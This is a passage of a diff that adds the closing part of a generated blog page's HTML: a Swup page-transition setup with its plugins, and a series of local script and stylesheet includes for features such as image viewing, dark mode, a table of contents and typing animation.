+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
